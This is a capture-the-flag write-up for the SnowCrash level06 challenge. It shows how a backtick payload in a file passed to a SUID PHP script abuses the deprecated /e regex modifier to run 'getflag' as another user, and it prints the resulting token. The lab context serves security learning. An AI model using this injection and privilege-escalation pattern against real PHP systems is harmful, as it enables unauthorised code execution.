##LEVEL06

```
    level06@SnowCrash:~$ ls -l
    total 12
    -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06    
    -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
https://www.redhat.com/sysadmin/suid-sgid-sticky-bit
 A file with SUID always executes as the user who owns the file

so we know now that we need to execute getflag command with level06 script;

https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
as stated here /e regex modifier allows us to use php code withing our regext expression

and by looking in to level06.php we can see that we can inject our code in this form [x <our code>]
and thanks to the suid bit we can run our code in user flag06 mode

level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag


level06@SnowCrash:~$ ./level06 /tmp/flag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1